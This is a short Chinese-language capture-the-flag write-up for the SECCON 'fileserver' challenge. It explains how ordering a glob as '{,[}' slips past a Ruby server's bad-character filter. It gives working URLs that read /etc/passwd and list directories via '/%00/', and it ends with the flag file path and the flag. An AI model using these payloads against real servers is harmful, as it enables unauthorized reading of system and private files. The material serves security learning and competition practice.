# fileserver

這題直接訪問`/app.rb`可以讀到source code

漏洞出在惡意字元的判斷

當檢查惡意字元時找到`[`，就會結束該迴圈，並檢查是否後面有`]`，有則回傳true (噴http 400)，沒有則回傳false

而`[`比`{`早被檢查

所以可以構造`{,[}`來繞過檢查，並不影響後續glob

接著就能任意讀檔:

http://fileserver.chal.seccon.jp:9292/%7B,%5B%7D/etc/passwd

但flag檔名未知，如果用`{1,2,3,4, ...}*32`之類的下去炸，又會把Server炸爛

所以得想辦法列目錄

最後找到`/%00/`可以列目錄:

http://fileserver.chal.seccon.jp:9292/%00/tmp/flags/

=> /tmp/flags/qqVnBHOmIS0SIJz97VLGaWXs2CtuQBNW.txt

接著讀檔就能拿到flag

=> `SECCON{You_are_the_Globbin'_Slayer}`
